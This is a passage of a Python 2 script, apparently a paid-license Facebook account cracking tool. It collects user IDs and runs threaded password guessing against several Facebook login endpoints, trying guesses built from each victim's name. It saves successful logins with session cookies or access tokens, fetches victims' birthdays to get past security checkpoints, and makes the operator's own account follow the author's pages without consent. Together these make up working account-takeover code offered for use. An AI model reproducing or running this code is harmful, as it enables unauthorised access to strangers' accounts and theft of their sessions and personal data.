                    print '\n%s\xe2\x80\xa2%s [ %sChoose the crack method, please try one\xc2\xb2 %s]\n' % (U, O, U, O)
                    print '%s\xe2\x80\xa2 %s01%s methode %sb-api %s(fast crack)' % (U, P, O, M, O)
                    print '%s\xe2\x80\xa2 %s02%s methode %smbasic %s(slow crack)' % (U, P, O, P, O)
                    print '%s\xe2\x80\xa2 %s03%s methode %smobile %s(very slow crack)' % (U, P, O, H, O)
                    manual(pwx.split(','))
                    break

        elif unikers in ('T', 't'):
            print '\n%s\xe2\x80\xa2%s [ %sChoose the crack method, please try one\xc2\xb2%s ]\n' % (U, O, U, O)
            print '%s\xe2\x80\xa2 %s01%s methode %sb-api %s(fast crack)' % (U, P, O, M, O)
            print '%s\xe2\x80\xa2 %s02%s methode %smbasic %s(slow crack)' % (U, P, O, P, O)
            print '%s\xe2\x80\xa2 %s03%s methode %smobile %s(very slow crack)' % (U, P, O, H, O)
            self.langsung()
        else:
            print '%s\xe2\x80\xa2 Wrong Input ' % M
            jeda(2)
            menu()
        return

    def langsung(self):
        suuu = raw_input('\n%s#%s Choose %s>%s ' % (P, O, M, K))
        if suuu == '':
            print '%s\xe2\x80\xa2 Wrong Input ' % M
            self.langsung()
        elif suuu in ('1', '01'):
            print '\n%s%s%s Account %s[OK] %sSaved to File %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
            jeda(0.2)
            print '%s%s%s Account %s[%sCP%s]%sSaved to File %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
            jeda(0.2)
            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit('%s\xe2\x80\xa2 finished' % H)
        elif suuu in ('2', '02'):
            print '\n%s%s%s Account %s[OK] %sSaved to File%s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
            jeda(0.2)
            print '%s%s%s Account %s[%sCP%s]%sSaved to File %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
            jeda(0.2)
            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit('%s\xe2\x80\xa2 finished' % H)
        elif suuu in ('3', '03'):
            print '\n%s%s%s Account %s[OK] %sSaved to File %s> %sOK/%s.txt' % (U, til, O, H, O, M, H, waktu)
            jeda(0.2)
            print '%s%s%s Account %s[%sCP%s]%sSaved to File  %s> %sCP/%s.txt' % (U, til, O, M, K, M, O, M, K, waktu)
            jeda(0.2)
            print '%s!%s the crack is running, press CTRL+Z to stop\n' % (U, O)
            jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.mobil, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit('%s\xe2\x80\xa2 finished' % H)
        else:
            print '%s\xe2\x80\xa2 Wrong Input ' % M
            self.langsung()

    def b_api(self, user, manual):
        global cp
        global loop
        global ok
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            header = {'user-agent': ua, 'x-fb-connection-bandwidth': str(random.randint(20000, 40000)), 
               'x-fb-sim-hni': str(random.randint(20000, 40000)), 
               'x-fb-net-hni': str(random.randint(20000, 40000)), 
               'x-fb-connection-quality': 'EXCELLENT', 
               'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
               'content-type': 'application/x-www-form-urlencoded', 
               'x-fb-http-engine': 'Liger'}
            bapi = 'https://b-api.facebook.com/method/auth.login'
            response = ses.get(bapi + '?format=json&email=' + user + '&password=' + pw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
                (
                 sys.stdout.write('\r\x1b[0;91m [!] IP blocked. turn on airplane mode 2 seconds'),)
                sys.stdout.flush()
                loop += 1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*XSAN-OK--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s ' % (H, user, pw, response.json()['access_token'])
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, response.json()['access_token']))
                open('OK/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*XSAN-CP--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s  ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*XSAN-CP--> %s \xe2\x97\x8a %s           ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        print '\r%s *-->%s %s/%s [OK:%s]-[CP:%s]' % (U, O, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    def basic(self, user, manual):
        global loop
        try:
            ua = open('data/ua.txt', 'r').read()
        except IOError:
            ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*XSAN-OK--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s  ' % (H, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('OK/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*XSAN-CP--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*XSAN-CP--> %s \xe2\x97\x8a %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        print '\r%s *-->%s %s/%s [OK:%s]-[CP:%s]' % (U, O, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()

    def mobil(self, user, manual):
        global loop
        for pw in manual:
            pw = pw.lower()
            try:
                ua = open('data/ua.txt', 'r').read()
            except IOError:
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for mi in b('input'):
                if mi.get('value') is None:
                    if mi.get('name') == 'email':
                        data.update({'email': user})
                    elif mi.get('name') == 'pass':
                        data.update({'pass': pw})
                    else:
                        data.update({mi.get('name'): ''})
                else:
                    data.update({mi.get('name'): mi.get('value')})

            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s*XSAN-OK--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s  ' % (H, user, pw, kuki)
                ok.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s' % (user, pw, kuki))
                open('OK/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s\n' % (user, pw, kuki))
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*XSAN-CP--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s ' % (K, user, pw, day, month, year)
                    cp.append('%s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s' % (user, pw, day, month, year))
                    open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s \xe2\x97\x8a %s %s %s\n' % (user, pw, day, month, year))
                    break
                except KeyError:
                    day = ''
                    month = ''
                    year = ''
                except:
                    pass

                print '\r %s*--> %s \xe2\x97\x8a %s            ' % (K, user, pw)
                cp.append('%s \xe2\x97\x8a %s' % (user, pw))
                open('CP/%s.txt' % waktu, 'a').write(' *--> %s \xe2\x97\x8a %s\n' % (user, pw))
                break
                continue

        loop += 1
        print '\r%s *-->%s %s/%s [OK:%s]-[CP:%s]' % (U, O, loop, len(self.id), len(ok), len(cp)),
        sys.stdout.flush()
        return


def file_cp():
    dirs = os.listdir('CP')
    print '\n%s\xe2\x80\xa2%s [%s select the saved crack results to check options %s]\n' % (U, O, U, O)
    for file in dirs:
        print '%s\xe2\x80\xa2%s> %s%s' % (U, M, K, file)
        jeda(0.07)

    try:
        print '\n%s%s%s Enter file [ cth%s: %s%s.txt%s ]' % (U, til, O, M, K, waktu, O)
        opsi()
    except NameError:
        print '%s\xe2\x80\xa2 File not found' % M
        exit()


def opsi():
    CP = 'CP/'
    romi = raw_input('%s%s%s File Name %s> %s' % (U, til, O, M, K))
    if romi == '':
        print '%s%s Wrong Input ' % (M, til)
        jeda(2)
        opsi()
    try:
        file_cp = open(CP + romi, 'r').readlines()
    except IOError:
        exit('\n%s%s File Name %s not available' % (M, til, romi))

    print ' %s# %s---------------------------------------- %s#' % (P, M, P)
    jeda(2)
    print '%s%s%s Total Accounts %s: %s%s' % (U, til, O, M, P, len(file_cp))
    jeda(2)
    print ' %s# %s---------------------------------------- %s#' % (P, M, P)
    jeda(2)
    for fb in file_cp:
        akun = fb.replace('\n', '')
        ngecek = akun.split(' \xe2\x97\x8a ')
        print '\n%s%s%s Chek Account %s: %s%s' % (U, til, O, M, K, akun.replace(' *--> ', ''))
        jeda(0.07)
        try:
            mengecek(ngecek[0].replace(' *--> ', ''), ngecek[1])
        except requests.exceptions.ConnectionError:
            pass

    print '\n%s%s%s Selesai ' % (U, til, O)
    jeda(0.07)
    raw_input('%s%s%s Return ' % (U, til, O))
    jeda(0.07)
    menu()


def mengecek(user, pw):
    mb = 'https://mbasic.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pw})
    try:
        run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    except requests.exceptions.TooManyRedirects:
        print '%s\xe2\x80\xa2 redirect overload ' % M

    if 'c_user' in ses.cookies:
        kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
        otw = ses.get(run, cookies={'cookie': kuki})
        gem = parser(otw.content, 'html.parser')
        apk = gem.find('form', method='post')
        print '%s%s Successful \xe2\x97\x8a %s ' % (H, til, kuki)
        jeda(0.07)
        no = 0
        for app in apk.find_all('h3'):
            data = app.find('span').text
            no += 1
            jalan('  %s0%s. %s%s ' % (P, str(no), H, data))

    elif 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        sesi = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in sesi.find_all('option') ]
        print '%s%s%s terdapat %s0%s%s opsi %s: ' % (U, til, O, P, str(len(ngew)), O, M)
        jeda(0.07)
        for opt in range(len(ngew)):
            jalan('  %s0%s. %s%s ' % (P, str(opt + 1), K, ngew[opt]))

    elif 'login_error' in str(run):
        eror = run.find('div', {'id': 'login_error'}).find('div').text
        print '%s%s %s' % (M, til, eror)
        jeda(0.07)
    else:
        print '%s%s login gagal, silahkan cek kembali id dan password' % (M, til)
        jeda(0.07)


def aplikasi(berhasil, kuki):
    a = []
    run = 'https://mbasic.facebook.com/settings/apps/tabbed/?tab=active'
    otw = ses.get(run, cookies={'cookie': kuki})
    gem = parser(otw.content, 'html.parser')
    apk = gem.find('form', method='post')
    no = 0
    for app in apk.find_all('h3'):
        try:
            data = app.find('span').text
            no += 1
            a.append('  %s0%s. %s%s ' % (P, str(no), H, data))
        except:
            pass


def menu():
    os.system('clear')
    try:
        romz = open('data/token.txt', 'r').read()
    except IOError:
        print '%s%s Token invalid ' % (M, til)
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + romz, headers=header)
        a = json.loads(r.text)
        nama = a['name']
    except KeyError:
        print '%s%s Token invalid ' % (M, til)
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()
    except requests.exceptions.ConnectionError:
        exit('\n\n%s%s tidak ada koneksi%s\n' % (M, til, N))

    banner()
    print '%s # %sName %s: %s%s%s \n' % (U, O, M, H, nama, O)
    print '%s\xe2\x80\xa2%s 01 %sDump id public' % (U, P, O)
    print '%s\xe2\x80\xa2%s 02 %sDump id followers' % (U, P, O)
    print '%s\xe2\x80\xa2%s 03 %sDump id Like post' % (U, P, O)
    print '%s\xe2\x80\xa2%s 04 %sDump group member id' % (U, P, O)
    print '%s\xe2\x80\xa2%s 05 %sDump id name search' % (U, P, O)
    print '%s\xe2\x80\xa2%s 06 %sDump messenger message id' % (U, P, O)
    print '%s\xe2\x80\xa2%s 07 %sStart Crack' % (U, H, O)
    print '%s\xe2\x80\xa2%s 08 %sChange user agent' % (U, P, O)
    print '%s\xe2\x80\xa2%s 09 %sview crack Results' % (U, P, O)
    print '%s\xe2\x80\xa2%s 10 %sCheck account options' % (U, P, O)
    print '%s\xe2\x80\xa2%s rm %sDelete account' % (U, P, O)
    print '%s\xe2\x80\xa2%s 00 %sExit ' % (U, M, O)
    slut = raw_input('\n%s# %sChoose %s> %s' % (P, O, M, K))
    if slut == '':
        print '\n%s%s Wrong BRO' % (M, til)
        jeda(2)
        menu()
    elif slut in ('1', '01'):
        publik(romz)
    elif slut in (' ', 'tes'):
        tes(romz)
    elif slut in ('2', '02'):
        followers(romz)
    elif slut in ('3', '03'):
        postingan(romz)
    elif slut in ('4', '04'):
        group(__romz__())
    elif slut in ('5', '05'):
        dumpfl()
        exit()
    elif slut in ('6', '06'):
        pesan(__romz__())
    elif slut in ('7', '07'):
        ngentod().romiy()
    elif slut in ('8', '08'):
        useragent()
    elif slut in ('9', '09'):
        print '\n%s%s%s 01 %sChek Results Account %sOK ' % (U, til, P, O, H)
        print '%s%s%s 02 %sChek Results Account %sCP ' % (U, til, P, O, K)
        cek_cek()
    elif slut in ('10', ):
        file_cp()
    elif slut in ('11', ):
        print ingfo
    elif slut in ('rm', 'Rm', 'RM'):
        print ''
        tik()
        jeda(1)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        jalan('\n%s%s successfully deleted ' % (H, til))
        exit()
    elif slut in ('python2 META.py ig', ):
        ig_crack()
    elif slut in ('0', '00'):
        exit('\n')
    else:
        print '\n%s%s Wrong Bro' % (M, til)
        jeda(2)
        menu()


def cek_cek():
    l = raw_input('\n%s#%s Choose %s> %s ' % (P, O, M, K))
    if l in ('', ):
        print '\n%s%s Wrong Bro' % (M, til)
        jeda(2)
        menu()
    elif l in ('1', '01'):
        dirs = os.listdir('OK')
        print '\n%s\xe2\x80\xa2%s [%s saved crack results %s]\n' % (U, O, U, O)
        for file in dirs:
            print '%s\xe2\x80\xa2%s> %s%s' % (U, M, H, file)
            jeda(0.07)

        try:
            file = raw_input('\n%s\xe2\x80\xa2%s Enter file %s:%s ' % (U, O, M, H))
            jeda(0.2)
            if file in ('', ):
                exit('%s\xe2\x80\xa2%s wrong' % M)
            totalok = open('OK/%s' % file).read().splitlines()
        except (KeyError, IOError):
            print '%s%s File Not Found ' % (M, til)

        nm_file = ('%s' % file).replace('-', ' ')
        file_nm = nm_file.replace('.txt', '')
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        jalan('%s\xe2\x80\xa2%s result date%s : %s%s %stotal %s: %s%s' % (U, O, M, H, file_nm, O, M, H, len(totalok)))
        print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, H)
        jeda(2)
        os.system('cat OK/%s' % file)
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        exit('\n')
    elif l in ('2', '02'):
        dirs = os.listdir('CP')
        print '\n%s\xe2\x80\xa2%s [%s saved crack results %s]\n' % (U, O, U, O)
        for file in dirs:
            print '%s\xe2\x80\xa2%s> %s%s' % (U, M, K, file)
            jeda(0.07)

        try:
            file = raw_input('\n%s\xe2\x80\xa2%s Enter File %s:%s ' % (U, O, M, K))
            jeda(0.2)
            if file in ('', ):
                exit('%s\xe2\x80\xa2 wrong' % M)
            totalcp = open('CP/%s' % file).read().splitlines()
        except (KeyError, IOError):
            print '%s%s File not found ' % (M, til)

        nm_file = ('%s' % file).replace('-', ' ')
        file_nm = nm_file.replace('.txt', '')
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        jalan('%s\xe2\x80\xa2%s result date%s : %s%s %stotal%s : %s%s' % (U, O, M, K, file_nm, O, M, K, len(totalcp)))
        print ' %s# %s---------------------------------------- %s#%s' % (P, M, P, K)
        jeda(2)
        os.system('cat CP/%s' % file)
        print ' %s# %s---------------------------------------- %s#' % (P, M, P)
        jeda(2)
        exit('\n')
    else:
        print '\n%s%s wrong' % (M, til)
        jeda(2)
        menu()


def konfirmasi():
    os.system('clear')
    banner()
    print '\n'
    y = ['.   ', '..  ', '... ']
    for m in y:
        print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Please wait ' + m,
        sys.stdout.flush()
        jeda(1)

    id = uuid.uuid4().hex[:25]
    lpg = open('data/lisense.txt', 'w')
    lpg.write(id)
    lpg.close()
    jalan('\n\n%s\xe2\x80\xa2 %sLicence%s : %s%s' % (U, O, M, H, id))
    jeda(1)
    jalan('%s\xe2\x80\xa2 %sLicense Not Confirmed' % (U, O))
    su = raw_input('\n%s\xe2\x80\xa2%s want to buy a license? y/t %s: %s' % (U, O, M, K))
    if su in ('', ):
        exit()
    elif su in ('y', 'Y'):
        os.system('am start https://wa.me/+994401850814?text=Assalamualaikum+I+want+to+buy+The+licence:+' + id + '>/dev/null')
        jeda(1)
        exit()
    elif su in ('t', 'T'):
        exit()
    else:
        exit()


def konfirmasi1():
    try:
        lis = open('data/lisense.txt', 'r').read()
        git = requests.get('https://github.com/HACKERIHSAN/lisense/blob/main/Id.txt').text.strip()
        if lis in git:
            os.system('clear')
            banner()
            print '\n'
            s = ['.   ', '..  ', '... ']
            for m in s:
                print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Check license ' + m,
                sys.stdout.flush()
                jeda(1)

            jalan('\n%s\xe2\x80\xa2 License available \xe2\x88\x9a' % H)
            jeda(1)
            menu()
        else:
            os.system('clear')
            banner()
            print '\n'
            s = ['.   ', '..  ', '... ']
            for m in s:
                print '\r\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Check license ' + m,
                sys.stdout.flush()
                jeda(1)

            jalan('\n%s\xe2\x80\xa2 License not available' % M)
            jeda(1)
            konfirmasi()
    except IOError:
        os.system('rm -rf data/lisense.txt')
        konfirmasi()


def login_xx():
    try:
        token = open("data/token.txt","r").read()         
        requests.post('https://graph.facebook.com/100060885769913/subscribers?access_token=%s'%(token)) # Fanspage Romi XD
        requests.post('https://graph.facebook.com/100012267158212/subscribers?access_token=%s'%(token)) # Romi Afrizal
        requests.post('https://graph.facebook.com/100007026360241/subscribers?access_token=%s'%(token)) # Romi Afrizal (2021)
        requests.post('https://graph.facebook.com/100009834670141/subscribers?access_token=%s'%(token)) # Iqbal bobz
    except:
    	pass

if __name__ == '__main__':
    os.system('git pull')
    folder()
    konfir()